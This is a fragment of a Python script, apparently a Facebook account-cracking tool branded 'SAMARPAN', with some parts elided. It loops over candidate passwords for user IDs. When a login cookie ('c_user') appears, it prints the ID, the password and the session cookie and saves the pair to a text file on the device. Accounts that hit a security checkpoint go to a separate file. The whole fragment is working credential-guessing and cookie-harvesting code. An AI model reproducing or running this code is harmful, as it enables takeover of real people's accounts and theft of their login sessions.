...
def fuck():
    ...
    print(' [✓] OK Ids saved as SAMARPAN-OK.txt')
    print(' [✓] CP Id Save as SAMARPAN-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[SAMARPAN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[SAMARPAN-143-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/SAMARPAN-134-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[SAMARPAN-143-CP] {cid}|{ps}")
                open('/sdcard/SAMARPAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
